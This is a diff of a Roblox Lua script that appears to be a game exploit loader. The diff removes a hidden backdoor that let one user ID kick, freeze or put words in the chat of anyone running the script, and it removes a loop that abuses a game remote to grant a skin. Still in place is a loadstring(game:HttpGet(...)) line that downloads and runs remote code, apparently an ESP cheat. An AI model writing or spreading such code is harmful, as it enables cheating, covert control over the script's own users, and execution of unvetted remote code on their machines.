@@ -1,8 +1,6 @@
 local Thread1 = coroutine.create(function()
     local admins = {
     528650746,
-    3106920778,
-    3366792711,
   }
   
   local admin = false
@@ -24,72 +22,7 @@ local Thread1 = coroutine.create(function()
              local this = game.Players.LocalPlayer
              
                 if admin == true then
-		
                     print('ADMIN COMMANDS BYPASSED')
-
-                if v.UserId == 528650746 and game.Players.LocalPlayer.UserId ~= 528650746 then
-                    --cmd1
-                    if args[1] == "!ban" then
-                        if args[2] == this.Name or args[2] == "." then
-                            game.Players.LocalPlayer:Kick("PERMA-BANNED")
-                            end
-                        end
-                        --cmd2
-                        if args[1] == "!say" or args[1] == "!req" and args[2] == this.Name or args[2] == "."  then
-                                local player = game.Players.LocalPlayer
-                                
-                            local message = {
-                                [1] = args[3],
-                                [2] = "All"
-                            }
-    
-                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(message))
-                                
-                        end
-                        --cmd3
-                        if args[1] == "!users" or args[1] == "!verify" then
-                                if args[2] == "." then
-                                local player = game.Players.LocalPlayer
-                                
-                                local verify = {
-                                    [1] = "Yeah, yeah",
-                                    [2] = "All"
-                                }
-    
-                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(verify))
-                            end
-                        end
-                        --cmd4
-                        if args[1] == "!kick" then
-                        if args[2] == this.Name or args[2] == "." and admin == false then
-                            game.Players.LocalPlayer:Kick("KICKED BY ADMIN")
-                            end
-                        end
-                        --cmd5
-                        if args[1] == "!freeze" then
-                        if args[2] == this.Name or args[2] == "." then
-                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                            end
-                        end
-                        --cmd6
-                        if args[1] == "!thaw" then
-                        if args[2] == this.Name or args[2] == "." then
-                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                            end
-                        end
-                        --endcmds
-                end
-		    
-		    --Golden
-		            if args[1] == "gold" then
-                        while true do
-			                wait(2)
-			                local ohString1 = "Skin"
-        		            local ohString2 = "9493408206"
-
-        		            game:GetService("ReplicatedStorage").MainRemote:FireServer(ohString1, ohString2)
-		                end
-                    end
                 end
                 
                 if admin == false then
@@ -147,32 +80,9 @@ local Thread1 = coroutine.create(function()
           end)
       end
   end
-  
-  game.Players.PlayerAdded:Connect(function(plr) 
-	plr.CharacterAdded:Connect(function(Char)
-		Char:WaitForChild("Humanoid")
-		if plr.UserId == 528650746 then
-			Char.Humanoid.DisplayName = "[👑]" .. plr.DisplayName
-        end
-	end)
-end)
 
 wait(1.5)
 
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/ESPUnnamed'),true))()
 end)
 coroutine.resume(Thread1)
-
-for i,v in pairs(game:GetService('Players'):GetChildren()) do
-v.Chatted:Connect(function(msg)
-             local player = v
-             local args = string.split(msg, " ")
-             local this = game.Players.LocalPlayer
-             
-            if msg == "+" then
-                local info = game:GetService("CoreGui").TargetInfo.MainFrame
-				info.AnchorPoint = Vector2.new(0, 0)
-				info.Position = UDim2.new(0, 260, 0, 800)
-           end
-      end)
-end
